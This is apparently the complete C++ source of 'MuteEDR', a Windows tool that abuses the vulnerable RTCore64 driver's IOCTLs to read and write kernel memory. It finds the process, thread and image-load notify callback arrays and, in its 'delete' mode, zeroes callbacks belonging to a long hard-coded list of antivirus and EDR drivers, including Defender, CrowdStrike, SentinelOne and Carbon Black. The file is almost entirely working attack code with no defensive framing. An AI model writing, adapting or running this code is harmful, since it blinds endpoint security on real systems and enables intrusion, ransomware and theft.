#include <Windows.h>
#include <aclapi.h>
#include <Psapi.h>
#include <cstdio>
#include <iostream>
#pragma warning(disable: 4996)

struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;


DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}
void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}
BYTE ReadMemoryBYTE(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 1, Address) & 0xffffff;
}


WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}

HANDLE GetDriverHandle() {

    HANDLE Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
    if (Device == INVALID_HANDLE_VALUE) {
        std::cout << "Unable to obtain a handle to the device object: " << GetLastError() << std::endl;
        ExitProcess(0);
    }
    return Device;

}

DWORD64 FindKernelBaseAddr() {
    DWORD cb = 0;
    LPVOID drivers[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb)) {
        return (DWORD64)drivers[0];
    }
    return NULL;
}

VOID SearchAndPatch(DWORD64 routineva, DWORD64 driverCount, LPVOID drivers2, BOOL Patch) {

    HANDLE Device = GetDriverHandle();
    DWORD64 innerRoutineAddress = 0;
    // 0x20 instructions is enough length to search for the first jmp
    // Look for the  "jmp nt!PspSetXXXXNotifyRoutine"
    // NOTE: This is not reliable. As some versions of windows doesn't have branch into PspXXXNotifyRoutines with call/jump instructions
    // But below extensive check for 0x90,0xc3,0xcc bytes should work just fine
    // YES, the piece of code below is fucked up I agree. But it works. (fingers crossed)
    for (DWORD64 i = 0; i < 0x20; i++) {
        DWORD64 nextaddr = routineva + i;
        BYTE byte1 = ReadMemoryBYTE(Device, nextaddr);
        DWORD64 decideBytes = ReadMemoryDWORD64(Device, nextaddr + 5);
        if (
            (byte1 == 0xe9 || byte1 == 0xe8) && (
                (decideBytes & 0x00000000000000ff) == 0x00000000000000c3 ||
                (decideBytes & 0x00000000000000ff) == 0x00000000000000cc ||
                (decideBytes & 0x00000000000000ff) == 0x0000000000000090 ||
                (decideBytes & 0x000000000000ff00) == 0x000000000000c300 ||
                (decideBytes & 0x000000000000ff00) == 0x000000000000cc00 ||
                (decideBytes & 0x000000000000ff00) == 0x0000000000009000 ||
                (decideBytes & 0x0000000000ff0000) == 0x0000000000c30000 ||
                (decideBytes & 0x0000000000ff0000) == 0x0000000000cc0000 ||
                (decideBytes & 0x0000000000ff0000) == 0x0000000000900000 ||
                (decideBytes & 0x00000000ff000000) == 0x00000000c3000000 ||
                (decideBytes & 0x00000000ff000000) == 0x00000000cc000000 ||
                (decideBytes & 0x00000000ff000000) == 0x0000000090000000 ||
                (decideBytes & 0x000000ff00000000) == 0x000000c300000000 ||
                (decideBytes & 0x000000ff00000000) == 0x000000cc00000000 ||
                (decideBytes & 0x000000ff00000000) == 0x0000009000000000 ||
                (decideBytes & 0x0000ff0000000000) == 0x0000c30000000000 ||
                (decideBytes & 0x0000ff0000000000) == 0x0000cc0000000000 ||
                (decideBytes & 0x0000ff0000000000) == 0x0000900000000000 ||
                (decideBytes & 0x00ff000000000000) == 0x00c3000000000000 ||
                (decideBytes & 0x00ff000000000000) == 0x00cc000000000000 ||
                (decideBytes & 0x00ff000000000000) == 0x0090000000000000 ||
                (decideBytes & 0xff00000000000000) == 0xc300000000000000 ||
                (decideBytes & 0xff00000000000000) == 0xcc00000000000000 ||
                (decideBytes & 0xff00000000000000) == 0x9000000000000000)
            ) { // Found "jmp/call nt!PspSetCreateProcessNotifyRoutine" "ret/nop/int"
            DWORD jmp_offset = ReadMemoryDWORD(Device, nextaddr + 1);
            // Address of jmp/call instruction + the extracted relative jmp address + 5 byte padding of the relative jmp/call instruction
            // Address of jmp/call is shifted to the right and then left to prevent overflowing in signed addition
            innerRoutineAddress = (((nextaddr) >> 32) << 32) + ((DWORD)(nextaddr)+jmp_offset) + 0x5;
            break;
        }

    }
    if (innerRoutineAddress == 0) {
        innerRoutineAddress = routineva;
    }
    HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD64 callbackArrayAddress;
    PVOID* drivers = (PVOID*)(drivers2);
    for (DWORD64 i = 0; i < 0x200; i++) {
        DWORD64 nextaddr = innerRoutineAddress + i;
        BYTE byte1 = ReadMemoryBYTE(Device, nextaddr);
        BYTE byte2 = ReadMemoryBYTE(Device, nextaddr + 1);
        if ((byte1 == 0x4c || byte1 == 0x48) && byte2 == 0x8d) {
            DWORD jmp_offset = ReadMemoryDWORD(Device, nextaddr + 3);
            // Address of lea instruction + the extracted relative jmp address + 7 byte padding of the relative lea instruction
            // Address of lea is shifted to the right and then left to prevent overflowing in signed addition
            callbackArrayAddress = (((nextaddr) >> 32) << 32) + ((DWORD)(nextaddr)+jmp_offset) + 0x7;
            std::cout << "[*] Callback Array for: " << routineva << std::hex << " -> " << callbackArrayAddress << std::endl;

            CHAR deviceName[MAX_PATH];
            for (BYTE i = 0; i < 0x10; i++) {
                DWORD64 nextaddr = callbackArrayAddress + i * 0x8;
                DWORD64 callBackAddr = ReadMemoryDWORD64(Device, nextaddr);
                if (callBackAddr != NULL) {
                    DWORD64 callBackAddrSfht = ((callBackAddr >> 4) << 4);
                    DWORD64 drivercallbackFuncAddr = ReadMemoryDWORD64(Device, callBackAddrSfht + 0x8);
                    for (int k = 0; k < driverCount - 1; k++) {
                        if (drivercallbackFuncAddr > reinterpret_cast<DWORD64>(drivers[k]) &&
                            drivercallbackFuncAddr < reinterpret_cast<DWORD64>(drivers[k + 1])) {
                            GetDeviceDriverBaseNameA((LPVOID)drivers[k], deviceName, sizeof(deviceName));
                            if (!(strcmp(deviceName, "EX64.sys") &&
                                strcmp(deviceName, "Eng64.sys") &&
                                strcmp(deviceName, "teefer2.sys") &&
                                strcmp(deviceName, "teefer3.sys") &&
                                strcmp(deviceName, "srtsp64.sys") &&
                                strcmp(deviceName, "srtspx64.sys") &&
                                strcmp(deviceName, "srtspl64.sys") &&
                                strcmp(deviceName, "Ironx64.sys") &&
                                strcmp(deviceName, "fekern.sys") &&
                                strcmp(deviceName, "cbk7.sys") &&
                                strcmp(deviceName, "WdFilter.sys") &&
                                strcmp(deviceName, "cbstream.sys") &&
                                strcmp(deviceName, "atrsdfw.sys") &&
                                strcmp(deviceName, "avgtpx86.sys") &&
                                strcmp(deviceName, "avgtpx64.sys") &&
                                strcmp(deviceName, "naswSP.sys") &&
                                strcmp(deviceName, "edrsensor.sys") &&
                                strcmp(deviceName, "CarbonBlackK.sys") &&
                                strcmp(deviceName, "parity.sys") &&
                                strcmp(deviceName, "csacentr.sys") &&
                                strcmp(deviceName, "csaenh.sys") &&
                                strcmp(deviceName, "csareg.sys") &&
                                strcmp(deviceName, "csascr.sys") &&
                                strcmp(deviceName, "csaav.sys") &&
                                strcmp(deviceName, "csaam.sys") &&
                                strcmp(deviceName, "rvsavd.sys") &&
                                strcmp(deviceName, "cfrmd.sys") &&
                                strcmp(deviceName, "cmdccav.sys") &&
                                strcmp(deviceName, "cmdguard.sys") &&
                                strcmp(deviceName, "CmdMnEfs.sys") &&
                                strcmp(deviceName, "MyDLPMF.sys") &&
                                strcmp(deviceName, "im.sys") &&
                                strcmp(deviceName, "csagent.sys") &&
                                strcmp(deviceName, "CybKernelTracker.sys") &&
                                strcmp(deviceName, "CRExecPrev.sys") &&
                                strcmp(deviceName, "CyOptics.sys") &&
                                strcmp(deviceName, "CyProtectDrv32.sys") &&
                                strcmp(deviceName, "CyProtectDrv64.sys.sys") &&
                                strcmp(deviceName, "groundling32.sys") &&
                                strcmp(deviceName, "groundling64.sys") &&
                                strcmp(deviceName, "esensor.sys") &&
                                strcmp(deviceName, "edevmon.sys") &&
                                strcmp(deviceName, "ehdrv.sys") &&
                                strcmp(deviceName, "FeKern.sys") &&
                                strcmp(deviceName, "WFP_MRT.sys") &&
                                strcmp(deviceName, "xfsgk.sys") &&
                                strcmp(deviceName, "fsatp.sys") &&
                                strcmp(deviceName, "fshs.sys") &&
                                strcmp(deviceName, "HexisFSMonitor.sys") &&
                                strcmp(deviceName, "klifks.sys") &&
                                strcmp(deviceName, "klifaa.sys") &&
                                strcmp(deviceName, "Klifsm.sys") &&
                                strcmp(deviceName, "mbamwatchdog.sys") &&
                                strcmp(deviceName, "mfeaskm.sys") &&
                                strcmp(deviceName, "mfencfilter.sys") &&
                                strcmp(deviceName, "PSINPROC.SYS") &&
                                strcmp(deviceName, "PSINFILE.SYS") &&
                                strcmp(deviceName, "amfsm.sys") &&
                                strcmp(deviceName, "amm8660.sys") &&
                                strcmp(deviceName, "amm6460.sys") &&
                                strcmp(deviceName, "eaw.sys") &&
                                strcmp(deviceName, "SAFE-Agent.sys") &&
                                strcmp(deviceName, "SentinelMonitor.sys") &&
                                strcmp(deviceName, "SAVOnAccess.sys") &&
                                strcmp(deviceName, "savonaccess.sys") &&
                                strcmp(deviceName, "sld.sys") &&
                                strcmp(deviceName, "pgpwdefs.sys") &&
                                strcmp(deviceName, "GEProtection.sys") &&
                                strcmp(deviceName, "diflt.sys") &&
                                strcmp(deviceName, "sysMon.sys") &&
                                strcmp(deviceName, "ssrfsf.sys") &&
                                strcmp(deviceName, "emxdrv2.sys") &&
                                strcmp(deviceName, "reghook.sys") &&
                                strcmp(deviceName, "spbbcdrv.sys") &&
                                strcmp(deviceName, "bhdrvx86.sys") &&
                                strcmp(deviceName, "bhdrvx64.sys") &&
                                strcmp(deviceName, "symevent.sys") &&
                                strcmp(deviceName, "vxfsrep.sys") &&
                                strcmp(deviceName, "VirtFile.sys") &&
                                strcmp(deviceName, "SymAFR.sys") &&
                                strcmp(deviceName, "symefasi.sys") &&
                                strcmp(deviceName, "symefa.sys") &&
                                strcmp(deviceName, "symefa64.sys") &&
                                strcmp(deviceName, "SymHsm.sys") &&
                                strcmp(deviceName, "evmf.sys") &&
                                strcmp(deviceName, "GEFCMP.sys") &&
                                strcmp(deviceName, "VFSEnc.sys") &&
                                strcmp(deviceName, "pgpfs.sys") &&
                                strcmp(deviceName, "fencry.sys") &&
                                strcmp(deviceName, "symrg.sys") &&
                                strcmp(deviceName, "ndgdmk.sys") &&
                                strcmp(deviceName, "ssfmonm.sys") &&
                                strcmp(deviceName, "SISIPSFileFilter.sys") &&
                                strcmp(deviceName, "cyverak.sys") &&
                                strcmp(deviceName, "cyvrfsfd.sys") &&
                                strcmp(deviceName, "cyvrmtgn.sys") &&
                                strcmp(deviceName, "tdevflt.sys") &&
                                strcmp(deviceName, "tedrdrv.sys") &&
                                strcmp(deviceName, "tedrpers.sys") &&
                                strcmp(deviceName, "telam.sys") &&
                                strcmp(deviceName, "cyvrlpc.sys") &&
                                strcmp(deviceName, "MpKslf8d86dba.sys"))) {
                                SetConsoleTextAttribute(hOutput, 9);
                                // Zero out the callback address
                                if (Patch)
                                    WriteMemoryDWORD64(Device, nextaddr, 0x0000000000000000);
                            }
                            std::cout << "[" << nextaddr << "]: " << drivercallbackFuncAddr << "->[" << deviceName << " + " << std::hex << (drivercallbackFuncAddr - reinterpret_cast<DWORD64>(drivers[k])) << "]" << std::endl;
                        }
                    }
                    SetConsoleTextAttribute(hOutput, 7);
                }
            }
            break;
        }
    }
}
int main(int argc, char** argv) {

    BOOL PATCH_CALLBACKS = FALSE;
    if (argc != 2) {
        std::cout << "[!] Missing Options" << std::endl;
        std::cout << "[*] Usage: MuteEDR.exe list/delete" << std::endl;
        ExitProcess(0);
    }

    if (strcmp(argv[1], "list") && strcmp(argv[1], "delete")) {
        std::cout << "[*] Usage: MuteEDR.exe list/delete" << std::endl;
        ExitProcess(0);
    }
    else if (!strcmp(argv[1], "delete")) {
        PATCH_CALLBACKS = TRUE;
    }

    HMODULE NToskrnl = LoadLibraryA("ntoskrnl.exe");
    const auto kernelBase = FindKernelBaseAddr();
    const DWORD64 processnotifyroutineva = kernelBase + (DWORD64(GetProcAddress(NToskrnl, "PsSetCreateProcessNotifyRoutine")) - DWORD64(NToskrnl));
    const DWORD64 threadnotifyroutineva = kernelBase + (DWORD64(GetProcAddress(NToskrnl, "PsSetCreateThreadNotifyRoutine")) - DWORD64(NToskrnl));
    const DWORD64 imagenotifyroutineva = kernelBase + (DWORD64(GetProcAddress(NToskrnl, "PsSetLoadImageNotifyRoutine")) - DWORD64(NToskrnl));

    FreeLibrary(NToskrnl);
    std::cout << "[*] Kernel Image Base (ntkrnlmp): " << std::hex << kernelBase << std::endl;
    std::cout << "[*] nt!PsSetCreateProcessNotifyRoutine: " << std::hex << processnotifyroutineva << std::endl;
    std::cout << "[*] nt!PsSetCreateThreadNotifyRoutine: " << std::hex << threadnotifyroutineva << std::endl;
    std::cout << "[*] nt!PsSetLoadImageNotifyRoutine: " << std::hex << imagenotifyroutineva << std::endl;




    //Install the service
    CHAR deviceName[MAX_PATH];

    //Get the device driver list and sort it in an ascending order
    DWORD cbNeeded = 0;
    LPVOID drivers[1024];
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
    DWORD driverCount = sizeof(drivers) / sizeof(drivers[0]);
    LPVOID temp = NULL;
    for (int k = 0; k < driverCount; k++) {
        GetDeviceDriverBaseNameA((LPVOID)drivers[k], deviceName, sizeof(deviceName));
        BYTE firstByte = (reinterpret_cast<DWORD64>(drivers[k]) >> 56);
        if (firstByte == 0xff) {
            for (int i = 0; i < driverCount; i++) {
                for (int j = i + 1; j < driverCount; j++) {
                    if (drivers[i] > drivers[j]) {
                        temp = drivers[i];
                        drivers[i] = drivers[j];
                        drivers[j] = temp;
                    }
                }
            }
        }
    }

    SearchAndPatch(processnotifyroutineva, driverCount, drivers, PATCH_CALLBACKS);
    SearchAndPatch(threadnotifyroutineva, driverCount, drivers, PATCH_CALLBACKS);
    SearchAndPatch(imagenotifyroutineva, driverCount, drivers, PATCH_CALLBACKS);
    return 0;
}